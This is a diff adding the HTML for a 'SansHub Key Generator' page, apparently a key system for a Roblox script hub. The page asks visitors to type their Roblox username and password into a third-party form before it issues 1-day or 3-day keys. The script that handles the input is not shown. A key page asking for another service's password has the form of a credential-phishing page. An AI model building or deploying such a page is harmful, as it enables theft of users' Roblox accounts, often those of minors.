@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SansHub Key Generator</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>SansHub</h1>
+            <p>Key Generator</p>
+        </div>
+        
+        <div id="auth-page" class="auth-page">
+            <div class="input-group">
+                <input type="text" id="roblox-username" placeholder="Enter your Roblox username">
+                <input type="password" id="roblox-password" placeholder="Enter your Roblox password">
+                <button id="login-btn">Login</button>
+            </div>
+            
+            <div class="captcha-container" id="captcha-container" style="display: none;">
+                <div class="g-recaptcha" data-sitekey="your_recaptcha_site_key"></div>
+            </div>
+            
+            <div class="key-options" style="display: none;">
+                <h3>Select Key Duration</h3>
+                <div class="option">
+                    <input type="radio" id="1-day" name="key-duration" value="1">
+                    <label for="1-day">1 Day</label>
+                </div>
+                <div class="option">
+                    <input type="radio" id="3-day" name="key-duration" value="3">
+                    <label for="3-day">3 Days</label>
+                </div>
+                
+                <button id="generate-key-btn">Generate Key</button>
+            </div>
+        </div>
+        
+        <div id="user-page" class="user-page" style="display: none;">
+            <div class="user-info">
+                <img id="user-avatar" src="" alt="User Avatar">
+                <h2 id="user-name">Username</h2>
+            </div>
+            
+            <div class="key-info">
+                <h3>Current Key</h3>
+                <p id="current-key">SansHub_XXXXXXXX</p>
+                <p id="key-duration">Expires in: <span id="time-remaining">23:59:59</span></p>
+            </div>
+            
+            <button id="generate-new-key-btn">Generate New Key</button>
+        </div>
+    </div>
+    
+    <script src="script.js"></script>
+</body>
+</html>
